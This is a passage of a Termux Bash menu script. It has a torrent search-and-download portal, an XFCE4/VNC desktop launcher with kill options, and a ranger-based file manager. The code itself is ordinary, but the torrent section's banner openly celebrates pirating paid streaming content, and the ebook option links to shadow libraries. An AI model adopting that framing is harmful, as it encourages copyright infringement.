                printf "  ${WH}Magnet link:${RESET}\n"
                printf "  ${FADE}%s${RESET}\n" "$magnet"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            *) return 0 ;;
        esac
    }

    # ── main portal loop ─────────────────────────────────────────────
    while true; do
        clear
        echo ""
        _dv23
        printf "  ${C23}${BOLD}TORRENT PORTAL  ·  SEARCH · PICK · DOWNLOAD  ·  SOI  ·  999${RESET}\n"
        _dv23
        echo ""
        printf "  ${WH}All searches stay inside Termux — no browser, no leaving the page.${RESET}\n"
        printf "  ${FADE}■ They pay for streaming we just paste the magnet and walk away · seeds don't snitch · 999${RESET}\n"
        echo ""
        _dv23
        echo ""
        printf "  ${C23}${BOLD}[1]${RESET}  ${WH}Search Everything${RESET}       ${FADE}— all categories, general search${RESET}\n"
        printf "  ${C23}${BOLD}[2]${RESET}  ${WH}Search Video / Movies${RESET}   ${FADE}— movies, TV shows, HD content${RESET}\n"
        printf "  ${C23}${BOLD}[3]${RESET}  ${WH}Search Music${RESET}            ${FADE}— MP3, FLAC, albums, discographies${RESET}\n"
        printf "  ${C23}${BOLD}[4]${RESET}  ${WH}Search Software / Apps${RESET}  ${FADE}— programs, APKs, tools${RESET}\n"
        printf "  ${C23}${BOLD}[5]${RESET}  ${WH}Browse Downloads${RESET}        ${FADE}— list files in torrent vault${RESET}\n"
        printf "  ${C23}${BOLD}[6]${RESET}  ${WH}Paste Magnet Link${RESET}       ${FADE}— drop a magnet directly into aria2c${RESET}\n"
        printf "  ${C23}${BOLD}[7]${RESET}  ${WH}Search eBooks${RESET}           ${FADE}— search Anna's Archive / Library Genesis${RESET}\n"
        printf "  ${C23}${BOLD}[8]${RESET}  ${WH}Vault Manager${RESET}           ${FADE}— size · delete · move torrent files${RESET}\n"
        printf "  ${C23}${BOLD}[9]${RESET}  ${WH}Download Status${RESET}         ${FADE}— live aria2c queue progress${RESET}\n"
        printf "  ${C23}${BOLD}[I]${RESET}  ${WH}Install aria2c${RESET}          ${FADE}— download engine (required)${RESET}\n"
        printf "  ${C23}${BOLD}[Q]${RESET}  ${WH}Queue Mode${RESET}              ${FADE}— paste multiple magnets, run all${RESET}\n"
        printf "  ${C23}${BOLD}[RS]${RESET} ${WH}Resume Session${RESET}          ${FADE}— continue interrupted download${RESET}\n"
        echo ""
        if command -v aria2c &>/dev/null; then
            printf "  ${GRN}● aria2c ready${RESET}\n"
        else
            printf "  ${YEL}○ aria2c not found — run [I] to install${RESET}\n"
        fi
        [[ $FEZZY_PROXY_ACTIVE -eq 1 ]] && printf "  ${GRN}● ProxyChains + Tor active — downloads routed through Tor${RESET}\n"
        echo ""
        _dv23
        echo ""
        printf "  ${FADE}[b] Back  ·  [m] Main Menu${RESET}\n"
        echo ""
        _dv23
        echo ""
        printf "  ${C23}${BOLD}Choice » ${RESET}"
        read -r tp_ch

        case "${tp_ch^^}" in
            1)
                printf "  ${WH}Search term: ${RESET}"; read -r tp_query
                [[ -z "$tp_query" ]] && continue
                _torrent_search "$tp_query" "0" "ALL" ;;
            2)
                printf "  ${WH}Search video/movies: ${RESET}"; read -r tp_query
                [[ -z "$tp_query" ]] && continue
                _torrent_search "$tp_query" "200" "VIDEO" ;;
            3)
                printf "  ${WH}Search music: ${RESET}"; read -r tp_query
                [[ -z "$tp_query" ]] && continue
                _torrent_search "$tp_query" "100" "MUSIC" ;;
            4)
                printf "  ${WH}Search software/apps: ${RESET}"; read -r tp_query
                [[ -z "$tp_query" ]] && continue
                _torrent_search "$tp_query" "300" "SOFTWARE" ;;
            5)
                echo ""
                _dv23
                printf "  ${C23}[TORRENT VAULT]${RESET} ${WH}%s${RESET}\n\n" "$TORDIR"
                local count; count=$(find "$TORDIR" -type f 2>/dev/null | wc -l)
                if [[ "$count" -eq 0 ]]; then
                    printf "  ${FADE}Vault empty — download something first${RESET}\n"
                else
                    find "$TORDIR" -type f -printf "  ${C23}●${RESET} %-45f  ${FADE}%s${RESET}\n" 2>/dev/null | \
                        awk '{printf "  ● %s\n", $0}' 2>/dev/null || \
                        ls -lh "$TORDIR" 2>/dev/null | tail -n +2 | awk '{printf "  '"${C23}"'●'"${RESET}"'  %-40s  '"${FADE}"'%s'"${RESET}"'\n", $9, $5}'
                    echo ""
                    printf "  ${GRN}%s file(s) in vault${RESET}\n" "$count"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            6)
                echo ""
                printf "  ${WH}Paste magnet link: ${RESET}"; read -r magnet
                [[ -z "$magnet" ]] && continue
                if ! command -v aria2c &>/dev/null; then
                    printf "  ${RED}aria2c not found — run [I] to install${RESET}\n"
                    echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r; continue
                fi
                echo ""
                printf "  ${C23}[*] Sending magnet to aria2c...${RESET}\n\n"
                mkdir -p "$TORDIR"
                aria2c --dir="$TORDIR" --seed-time=0 "$magnet" \
                    && printf "  ${GRN}✓ Download complete — check %s${RESET}\n" "$TORDIR" \
                    || printf "  ${RED}Failed — check magnet link${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            7)
                echo ""; printf "  ${WH}Book title or author: ${RESET}"; read -r bquery
                [[ -z "$bquery" ]] && continue
                local benc; benc=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$bquery" 2>/dev/null || echo "$bquery")
                echo ""
                printf "  ${C23}[1]${RESET} Anna's Archive:   ${WH}https://annas-archive.org/search?q=%s${RESET}\n" "$benc"
                printf "  ${C23}[2]${RESET} Library Genesis:  ${WH}https://libgen.is/search.php?req=%s${RESET}\n" "$benc"
                printf "  ${C23}[3]${RESET} Open Library:     ${WH}https://openlibrary.org/search?q=%s${RESET}\n" "$benc"
                echo ""
                printf "  ${FADE}Copy URL to browser, get a magnet link, then use [6] to pull${RESET}\n"
                printf "  ${WH}Or paste direct download URL for wget: ${RESET}"; read -r durl
                if [[ -n "$durl" && "$durl" =~ ^https?:// ]]; then
                    printf "  ${C23}[*] Downloading...${RESET}\n\n"
                    wget -P "$TORDIR" "$durl" \
                        && printf "  ${GRN}✓ Saved to %s${RESET}\n" "$TORDIR" \
                        || printf "  ${RED}Download failed${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            8)
                echo ""
                _dv23
                printf "  ${C23}${BOLD}VAULT MANAGER — %s${RESET}\n\n" "$TORDIR"
                local vcount; vcount=$(find "$TORDIR" -type f 2>/dev/null | wc -l)
                local vsize; vsize=$(du -sh "$TORDIR" 2>/dev/null | awk '{print $1}')
                printf "  ${WH}Files: %s  ·  Size: %s${RESET}\n\n" "$vcount" "${vsize:-0}"
                mapfile -t vfiles < <(find "$TORDIR" -type f 2>/dev/null | sort)
                if [[ ${#vfiles[@]} -eq 0 ]]; then
                    printf "  ${FADE}Vault is empty${RESET}\n"
                    echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r; continue
                fi
                for i in "${!vfiles[@]}"; do
                    local vsz; vsz=$(du -sh "${vfiles[$i]}" 2>/dev/null | awk '{print $1}')
                    printf "  ${C23}%3d.${RESET} %-45s ${FADE}%s${RESET}\n" "$((i+1))" "$(basename "${vfiles[$i]}")" "$vsz"
                done
                echo ""
                printf "  ${WH}[d] Delete · [m] Move to sdcard · [ENTER] Cancel: ${RESET}"; read -r vact
                case "${vact,,}" in
                    d)
                        printf "  ${WH}File number to delete: ${RESET}"; read -r vnum
                        local vidx=$(( vnum - 1 ))
                        [[ -f "${vfiles[$vidx]}" ]] && rm "${vfiles[$vidx]}" && printf "  ${GRN}✓ Deleted${RESET}\n" || printf "  ${RED}Invalid${RESET}\n" ;;
                    m)
                        printf "  ${WH}File number to move to /sdcard/Download: ${RESET}"; read -r vnum
                        local vidx=$(( vnum - 1 ))
                        [[ -f "${vfiles[$vidx]}" ]] && mv "${vfiles[$vidx]}" /sdcard/Download/ && printf "  ${GRN}✓ Moved${RESET}\n" || printf "  ${RED}Invalid${RESET}\n" ;;
                esac
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            I)
                echo ""
                printf "  ${C23}[*] Installing aria2c...${RESET}\n\n"
                pkg install aria2 -y
                echo ""
                command -v aria2c &>/dev/null && printf "  ${GRN}✓ aria2c installed${RESET}\n" || printf "  ${YEL}Try: pkg install aria2${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            9)
                clear; echo ""
                _dv23
                printf "  ${C23}${BOLD}DOWNLOAD STATUS  ·  aria2c  ·  live${RESET}\n"
                _dv23; echo ""
                if ! command -v aria2c &>/dev/null; then
                    printf "  ${RED}aria2c not installed — run [I] first${RESET}\n"
                    echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r; continue
                fi
                # Check for running aria2c processes
                local _apids
                _apids=$(pgrep -x aria2c 2>/dev/null)
                if [[ -z "$_apids" ]]; then
                    printf "  ${FADE}No active aria2c downloads running${RESET}\n\n"
                else
                    printf "  ${GRN}● aria2c is RUNNING (PID: %s)${RESET}\n\n" "$_apids"
                    printf "  ${WH}Active download processes:${RESET}\n\n"
                    ps -p "$_apids" -o pid,etime,args 2>/dev/null | sed 's/^/  /'
                fi
                echo ""
                # Show vault contents with sizes
                printf "  ${C23}── VAULT CONTENTS ──────────────────────────${RESET}\n\n"
                local _tvcount; _tvcount=$(find "$TORDIR" -type f 2>/dev/null | wc -l)
                local _tvsize; _tvsize=$(du -sh "$TORDIR" 2>/dev/null | awk '{print $1}')
                printf "  ${WH}Files: %s  ·  Total size: %s${RESET}\n\n" "$_tvcount" "${_tvsize:-0}"
                find "$TORDIR" -type f 2>/dev/null | sort | while IFS= read -r _tf; do
                    local _tsz; _tsz=$(du -sh "$_tf" 2>/dev/null | awk '{print $1}')
                    printf "  ${C23}●${RESET}  %-40s  ${FADE}%s${RESET}\n" "$(basename "$_tf")" "$_tsz"
                done
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            B) return 0 ;;
            M) media_station_portal; return ;;
            *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
        esac
    done 2>/dev/null
}


# ═══════════════════════════════════════════════════════════════════
#  [24] TERMUX DESKTOP PORTAL — VNC · XFCE4 · KILL OPS
# ═══════════════════════════════════════════════════════════════════

termux_desktop_portal() {
    clear
    echo ""
    _dv24
    printf "  ${C24}${BOLD}▶  TERMUX DESKTOP PORTAL  ·  VNC · XFCE4 · KILL OPS  ·  999${RESET}\n"
    _dv24
    echo ""
    _spin "Checking X11 session state" 0.4 "${C24}"
    _spin "Scanning desktop processes" 0.4 "${FADE}"
    _spin "VNC engine standing by" 0.3 "${C24}"
    echo ""
    _dv24
    echo ""
    _countdown "TERMUX DESKTOP LOCKED IN"
    printf "  ${FADE}Rootless graphical desktop on Android. Kill fast. Launch clean. SOI.${RESET}\n"
    echo ""
    _dv24
    echo ""

    while true; do
        clear
        echo ""
        _dv24
        printf "  ${C24}${BOLD}TERMUX DESKTOP PORTAL  ·  VNC · XFCE4 · KILL OPS  ·  SOI  ·  999${RESET}\n"
        _dv24
        echo ""

        # Live status
        local x11_pid; x11_pid=$(pgrep -f termux-x11 2>/dev/null | head -1)
        local xfce_pid; xfce_pid=$(pgrep -f xfce4-session 2>/dev/null | head -1)
        local vnc_pid; vnc_pid=$(pgrep -f Xvnc 2>/dev/null | head -1)
        local dbus_pid; dbus_pid=$(pgrep -f dbus-daemon 2>/dev/null | head -1)
        local cur_disp="${DISPLAY:-not set}"

        printf "  ${WH}DISPLAY = %s${RESET}\n" "$cur_disp"
        printf "  ${WH}XDG_RUNTIME_DIR = %s${RESET}\n" "${XDG_RUNTIME_DIR:-not set}"
        echo ""
        [[ -n "$x11_pid"  ]] && printf "  ${GRN}● Termux-X11   RUNNING  pid:%s${RESET}\n" "$x11_pid"  || printf "  ${RED}○ Termux-X11   STOPPED${RESET}\n"
        [[ -n "$xfce_pid" ]] && printf "  ${GRN}● XFCE4        RUNNING  pid:%s${RESET}\n" "$xfce_pid" || printf "  ${RED}○ XFCE4        STOPPED${RESET}\n"
        [[ -n "$vnc_pid"  ]] && printf "  ${GRN}● VNC Server   RUNNING  pid:%s${RESET}\n" "$vnc_pid"  || printf "  ${FADE}○ VNC Server   not detected${RESET}\n"
        [[ -n "$dbus_pid" ]] && printf "  ${GRN}● dbus-daemon  RUNNING  pid:%s${RESET}\n" "$dbus_pid" || printf "  ${FADE}○ dbus-daemon  not detected${RESET}\n"
        echo ""
        _dv24
        echo ""
        printf "  ${FADE}── LAUNCH ─────────────────────────────────────────────────────${RESET}\n"
        printf "  ${C24}${BOLD}[1]${RESET}  ${WH}Launch XFCE4 via Termux-X11${RESET}   ${FADE}— fixed sequence, clean every time${RESET}\n"
        printf "  ${C24}${BOLD}[2]${RESET}  ${WH}Launch with VNC server${RESET}         ${FADE}— vncserver :1 · port 5901${RESET}\n"
        printf "  ${C24}${BOLD}[3]${RESET}  ${WH}Open xfce4-terminal only${RESET}       ${FADE}— terminal window on existing desktop${RESET}\n"
        echo ""
        printf "  ${FADE}── KILL OPS ───────────────────────────────────────────────────${RESET}\n"
        printf "  ${C24}${BOLD}[4]${RESET}  ${WH}Kill XFCE4 session${RESET}\n"
        printf "  ${C24}${BOLD}[5]${RESET}  ${WH}Kill Termux-X11${RESET}\n"
        printf "  ${C24}${BOLD}[6]${RESET}  ${WH}Kill VNC server${RESET}\n"
        printf "  ${C24}${BOLD}[7]${RESET}  ${WH}Kill dbus-daemon${RESET}\n"
        printf "  ${C24}${BOLD}[K]${RESET}  ${RED}${BOLD}KILL ALL — nuke entire desktop session${RESET}\n"
        echo ""
        printf "  ${FADE}── TOOLS ──────────────────────────────────────────────────────${RESET}\n"
        printf "  ${C24}${BOLD}[8]${RESET}  ${WH}Reload ~/.bashrc${RESET}\n"
        printf "  ${C24}${BOLD}[9]${RESET}  ${WH}Install packages (X11 + XFCE4 + VNC)${RESET}\n"
        printf "  ${C24}${BOLD}[S]${RESET}  ${WH}Create ~/launch_xfce.sh shortcut${RESET}\n"
        printf "  ${C24}${BOLD}[R]${RESET}  ${WH}Refresh status${RESET}\n"
        printf "  ${C24}${BOLD}[P]${RESET}  ${WH}Print manual launch commands${RESET}\n"
        echo ""
        _dv24
        echo ""
        printf "  ${FADE}[b] Back  ·  [m] Main Menu${RESET}\n"
        echo ""
        _dv24
        echo ""
        printf "  ${C24}${BOLD}Choice » ${RESET}"
        read -r td_ch

        case "${td_ch^^}" in
            1)
                echo ""
                printf "  ${C24}[*] Launching XFCE4 via Termux-X11 — fixed sequence${RESET}\n\n"
                printf "  ${FADE}  Killing stale sessions...${RESET}\n"
                pkill -f xfce4-session 2>/dev/null
                pkill -f termux-x11 2>/dev/null
                sleep 1
                printf "  ${FADE}  Reloading environment...${RESET}\n"
                source ~/.bashrc 2>/dev/null
                export DISPLAY=:0
                export XDG_RUNTIME_DIR="${TMPDIR:-/data/data/com.termux/files/usr/tmp}"
                printf "  ${FADE}  Starting Termux-X11 (:0)...${RESET}\n"
                if command -v termux-x11 &>/dev/null; then
                    termux-x11 :0 &
                    sleep 2
                    printf "  ${FADE}  Launching XFCE4 via dbus...${RESET}\n"
                    dbus-launch --exit-with-session xfce4-session &
                    sleep 1
                    printf "  ${GRN}✓ Desktop launched${RESET}\n"
                    printf "  ${WH}Open the Termux-X11 app on Android to see your desktop.${RESET}\n"
                else
                    printf "  ${RED}termux-x11 not found — run [9] to install${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            2)
                echo ""
                printf "  ${C24}[*] Launching VNC server...${RESET}\n\n"
                pkill Xvnc 2>/dev/null; pkill x11vnc 2>/dev/null; sleep 0.5
                if command -v vncserver &>/dev/null; then
                    export DISPLAY=:1
                    vncserver :1 -geometry 1280x720 -depth 24 2>/dev/null
                    sleep 1
                    DISPLAY=:1 dbus-launch --exit-with-session xfce4-session &>/dev/null &
                    printf "  ${GRN}✓ VNC running on :1 (port 5901)${RESET}\n"
                    printf "  ${WH}Connect with any VNC viewer → localhost:5901${RESET}\n"
                    printf "  ${FADE}Phone apps: bVNC (Play Store) · RealVNC · TigerVNC${RESET}\n"
                else
                    printf "  ${RED}vncserver not found${RESET}\n"
                    printf "  ${FADE}Install: pkg install tigervnc${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            3)
                echo ""
                if [[ -z "$DISPLAY" ]]; then
                    export DISPLAY=:0
                    export XDG_RUNTIME_DIR="${TMPDIR:-/data/data/com.termux/files/usr/tmp}"
                fi
                xfce4-terminal &>/dev/null &
                printf "  ${GRN}✓ xfce4-terminal launched on DISPLAY=%s${RESET}\n" "$DISPLAY"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            4)
                echo ""
                pkill -f xfce4-session 2>/dev/null && printf "  ${GRN}✓ xfce4-session killed${RESET}\n" || printf "  ${FADE}○ not running${RESET}\n"
                pkill -f xfce4 2>/dev/null
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            5)
                echo ""
                pkill -f termux-x11 2>/dev/null && printf "  ${GRN}✓ termux-x11 killed${RESET}\n" || printf "  ${FADE}○ not running${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            6)
                echo ""
                vncserver -kill :1 2>/dev/null
                pkill Xvnc 2>/dev/null && printf "  ${GRN}✓ Xvnc killed${RESET}\n" || printf "  ${FADE}○ not running${RESET}\n"
                pkill x11vnc 2>/dev/null
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            7)
                echo ""
                pkill dbus-daemon 2>/dev/null && printf "  ${GRN}✓ dbus-daemon killed${RESET}\n" || printf "  ${FADE}○ not running${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            K)
                echo ""
                printf "  ${RED}${BOLD}[KILL ALL]${RESET}  ${WH}Terminating all desktop processes...${RESET}\n\n"
                for proc in xfce4-session xfce4 termux-x11 dbus-daemon; do
                    pkill -f "$proc" 2>/dev/null && printf "  ${GRN}✓ %s killed${RESET}\n" "$proc" || printf "  ${FADE}○ %s not running${RESET}\n" "$proc"
                done
                pkill Xvnc 2>/dev/null && printf "  ${GRN}✓ Xvnc killed${RESET}\n" || printf "  ${FADE}○ Xvnc not running${RESET}\n"
                pkill x11vnc 2>/dev/null
                unset DISPLAY XDG_RUNTIME_DIR 2>/dev/null
                echo ""
                printf "  ${GRN}✓ Desktop session fully terminated${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            8)
                echo ""
                source ~/.bashrc 2>/dev/null
                printf "  ${GRN}✓ ~/.bashrc reloaded${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            9)
                echo ""
                printf "  ${C24}[*] Installing desktop packages...${RESET}\n\n"
                pkg install x11-repo -y 2>/dev/null
                pkg install termux-x11-nightly xfce4 xfce4-terminal xfce4-goodies dbus -y 2>/dev/null
                echo ""
                printf "  ${C24}Optional VNC:${RESET}\n"
                printf "  ${WH}pkg install tigervnc  — full VNC server${RESET}\n"
                printf "  ${WH}pkg install x11vnc    — alternative VNC${RESET}\n"
                printf "\n  ${FADE}Also download Termux-X11 APK: https://github.com/termux/termux-x11/releases${RESET}\n"
                echo ""; printf "  ${GRN}✓ Done${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            S)
                echo ""
                cat > "$HOME/launch_xfce.sh" << 'SHORTEOF'
#!/bin/bash
# Fezzy Station — XFCE4 Desktop Launcher
# SOI · 999 · philfesters

pkill -f xfce4-session 2>/dev/null
pkill -f termux-x11 2>/dev/null
sleep 1

source ~/.bashrc 2>/dev/null

export DISPLAY=:0
export XDG_RUNTIME_DIR="${TMPDIR:-/data/data/com.termux/files/usr/tmp}"

echo "[*] Starting Termux-X11 on :0..."
termux-x11 :0 &
sleep 2

echo "[*] Launching XFCE4 session..."
dbus-launch --exit-with-session xfce4-session &
sleep 1

echo "[✓] Desktop ready — open Termux-X11 app on Android"
SHORTEOF
                chmod +x "$HOME/launch_xfce.sh"
                printf "  ${GRN}✓ Created: ~/launch_xfce.sh${RESET}\n"
                printf "  ${WH}Run: bash ~/launch_xfce.sh${RESET}\n\n"
                # Add alias to bashrc
                grep -q "alias desktop=" ~/.bashrc 2>/dev/null || \
                    echo "alias desktop='bash ~/launch_xfce.sh'" >> ~/.bashrc
                printf "  ${GRN}✓ Alias 'desktop' added to ~/.bashrc${RESET}\n"
                printf "  ${FADE}After: source ~/.bashrc — then just type: desktop${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            R) continue ;;
            P)
                echo ""
                _dv24
                printf "  ${C24}MANUAL LAUNCH SEQUENCE — run in order:${RESET}\n\n"
                printf "  ${WH}pkill -f xfce4-session ; pkill -f termux-x11${RESET}\n"
                printf "  ${WH}source ~/.bashrc${RESET}\n"
                printf "  ${WH}export DISPLAY=:0${RESET}\n"
                printf '  ${WH}export XDG_RUNTIME_DIR=$TMPDIR${RESET}\n'
                printf "  ${WH}termux-x11 :0 &${RESET}\n"
                printf "  ${WH}sleep 2${RESET}\n"
                printf "  ${WH}dbus-launch --exit-with-session xfce4-session &${RESET}\n"
                echo ""
                printf "  ${C24}KILL EVERYTHING:${RESET}\n\n"
                printf "  ${WH}pkill -f xfce4 ; pkill -f termux-x11 ; pkill Xvnc ; pkill dbus-daemon${RESET}\n"
                _dv24
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            B) return 0 ;;
            M) media_station_portal; return ;;
            *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
        esac
    done 2>/dev/null
}

# ═══════════════════════════════════════════════════════════════════
#  [25] FILE MANAGER PORTAL — RANGER · BROWSE · VAULT ACCESS
# ═══════════════════════════════════════════════════════════════════

filemanager_portal() {
    clear
    echo ""
    _dv25
    printf "  ${C25}${BOLD}▶  FILE MANAGER PORTAL  ·  RANGER · VAULT ACCESS · OPS  ·  999${RESET}\n"
    _dv25
    echo ""
    _spin "Scanning vault directories" 0.4 "${C25}"
    _spin "Loading file index" 0.3 "${FADE}"
    echo ""
    _dv25
    echo ""
    _countdown "FILE MANAGER LOCKED IN"
    printf "  ${FADE}Every file. Every folder. Every vault. Nothing hidden. SOI.${RESET}\n"
    echo ""
    _dv25
    echo ""

    while true; do
        clear
        echo ""
        _dv25
        printf "  ${C25}${BOLD}FILE MANAGER PORTAL  ·  RANGER · NCDU · VAULT ACCESS  ·  999${RESET}\n"
        _dv25
        echo ""
        # vault summary
        local dl_count; dl_count=$(find "$DLDIR" -type f 2>/dev/null | wc -l)
        local music_count; music_count=$(find "$MUSICDIR" -type f 2>/dev/null | wc -l)
        local vid_count; vid_count=$(find "$VIDDIR" -type f 2>/dev/null | wc -l)
        local hack_count; hack_count=$(find "$HACKDIR" -type f 2>/dev/null | wc -l)
        printf "  ${C25}[VAULTS]${RESET}  Downloads: ${WH}%s${RESET}  Music: ${WH}%s${RESET}  Video: ${WH}%s${RESET}  Hacker: ${WH}%s${RESET}\n" \
            "$dl_count" "$music_count" "$vid_count" "$hack_count"
        echo ""
        _dv25
        echo ""
        printf "  ${FADE}── NAVIGATE ───────────────────────────────────────────────────${RESET}\n"
        printf "  ${C25}${BOLD}[1]${RESET}  ${WH}Open Ranger in Downloads${RESET}          ${FADE}— full file manager${RESET}\n"
        printf "  ${C25}${BOLD}[2]${RESET}  ${WH}Open Ranger in custom path${RESET}        ${FADE}— type any path${RESET}\n"
        printf "  ${C25}${BOLD}[3]${RESET}  ${WH}Open Ranger in Hacker Reports${RESET}     ${FADE}— \$HACKDIR vault${RESET}\n"
        printf "  ${C25}${BOLD}[4]${RESET}  ${WH}Open Ranger in Music vault${RESET}\n"
        printf "  ${C25}${BOLD}[5]${RESET}  ${WH}Open Ranger in Video vault${RESET}\n"
        echo ""
        printf "  ${FADE}── DISK & STATS ────────────────────────────────────────────────${RESET}\n"
        printf "  ${C25}${BOLD}[6]${RESET}  ${WH}ncdu — disk usage map (Downloads)${RESET}\n"
        printf "  ${C25}${BOLD}[7]${RESET}  ${WH}ncdu — disk usage map (all storage)${RESET}\n"
        printf "  ${C25}${BOLD}[8]${RESET}  ${WH}df -h — storage overview${RESET}\n"
        echo ""
        printf "  ${FADE}── FILE OPS ────────────────────────────────────────────────────${RESET}\n"
        printf "  ${C25}${BOLD}[9]${RESET}  ${WH}Open file with termux-open${RESET}        ${FADE}— Android open dialog${RESET}\n"
        printf "  ${C25}${BOLD}[10]${RESET} ${WH}Count files in a folder${RESET}\n"
        printf "  ${C25}${BOLD}[11]${RESET} ${WH}Find large files (>50MB) in Downloads${RESET}\n"
        printf "  ${C25}${BOLD}[12]${RESET} ${WH}List recent files (last 24h) in Downloads${RESET}\n"
        printf "  ${C25}${BOLD}[13]${RESET} ${WH}Delete empty folders in Downloads${RESET}\n"
        printf "  ${C25}${BOLD}[14]${RESET} ${WH}Create zip archive from folder${RESET}\n"
        printf "  ${C25}${BOLD}[I]${RESET}  ${WH}Install ranger + ncdu${RESET}\n"
        echo ""
        _dv25
        echo ""
        printf "  ${FADE}[b] Back  ·  [m] Main Menu${RESET}\n"
        echo ""
        _dv25
        echo ""
        printf "  ${C25}${BOLD}Choice » ${RESET}"
        read -r fm_ch

        case "${fm_ch^^}" in
            1)  command -v ranger &>/dev/null && ranger "$DLDIR" || printf "  ${YEL}ranger not found — run [I]${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            2)  echo ""
                printf "  ${WH}Path (or ENTER for ~): ${RESET}"; read -r fm_path
                fm_path=$(_xpath "${fm_path:-$HOME}")
                command -v ranger &>/dev/null && ranger "$fm_path" || printf "  ${YEL}ranger not found — run [I]${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            3)  command -v ranger &>/dev/null && ranger "$HACKDIR" || printf "  ${YEL}ranger not found — run [I]${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            4)  command -v ranger &>/dev/null && ranger "$MUSICDIR" || printf "  ${YEL}ranger not found — run [I]${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            5)  command -v ranger &>/dev/null && ranger "$VIDDIR" || printf "  ${YEL}ranger not found — run [I]${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            6)  echo ""
                command -v ncdu &>/dev/null && ncdu "$DLDIR" || printf "  ${YEL}ncdu not found — run [I]${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            7)  echo ""
                command -v ncdu &>/dev/null && ncdu ~/storage || printf "  ${YEL}ncdu not found — run [I]${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            8)  echo ""; _dv25; df -h 2>/dev/null; _dv25
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            9)  echo ""
                printf "  ${WH}File path: ${RESET}"; read -r fm_open
                fm_open=$(_xpath "$fm_open")
                [[ -f "$fm_open" ]] && termux-open "$fm_open" 2>/dev/null || printf "  ${RED}File not found${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            10) echo ""
                printf "  ${WH}Folder path: ${RESET}"; read -r fm_cnt_path
                fm_cnt_path=$(_xpath "${fm_cnt_path:-$DLDIR}")
                local fc; fc=$(find "$fm_cnt_path" -type f 2>/dev/null | wc -l)
                printf "  ${C25}%s files in %s${RESET}\n" "$fc" "$fm_cnt_path"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            11) echo ""
                printf "  ${C25}[*] Large files (>50MB) in Downloads:${RESET}\n\n"
                find "$DLDIR" -type f -size +50M -printf "  ${C25}●${RESET}  %-50f  ${FADE}%s${RESET}\n" 2>/dev/null | \
                    awk '{printf "  ● %s\n", $0}' 2>/dev/null || \
                    find "$DLDIR" -type f -size +50M 2>/dev/null | while read -r big; do
                        local sz; sz=$(du -sh "$big" 2>/dev/null | cut -f1)
                        printf "  ${C25}●${RESET}  %-50s  ${FADE}%s${RESET}\n" "$(basename "$big")" "$sz"
                    done
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            12) echo ""
                printf "  ${C25}[*] Files changed in last 24h in Downloads:${RESET}\n\n"
                find "$DLDIR" -type f -mtime -1 2>/dev/null | while read -r rf; do
                    printf "  ${C25}●${RESET}  %s\n" "$(basename "$rf")"
                done
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            13) echo ""
                printf "  ${WH}Remove empty folders from Downloads? [y/n]: ${RESET}"; read -r fm_del
                if [[ "$fm_del" == "y" || "$fm_del" == "Y" ]]; then
                    find "$DLDIR" -type d -empty -delete 2>/dev/null
                    printf "  ${GRN}✓ Empty folders removed${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            14) echo ""
                printf "  ${WH}Folder to zip: ${RESET}"; read -r fm_zip_src
                fm_zip_src=$(_xpath "$fm_zip_src")
                printf "  ${WH}Output name (e.g. archive.zip): ${RESET}"; read -r fm_zip_out
                [[ -z "$fm_zip_out" ]] && fm_zip_out="archive_$(date +%Y%m%d_%H%M).zip"
                local fm_zip_dest="$DLDIR/${fm_zip_out%.zip}.zip"
                zip -r "$fm_zip_dest" "$fm_zip_src" 2>/dev/null \
                    && printf "  ${GRN}✓ Created: %s${RESET}\n" "$fm_zip_dest" \
                    || printf "  ${RED}zip failed — install: pkg install zip${RESET}\n"
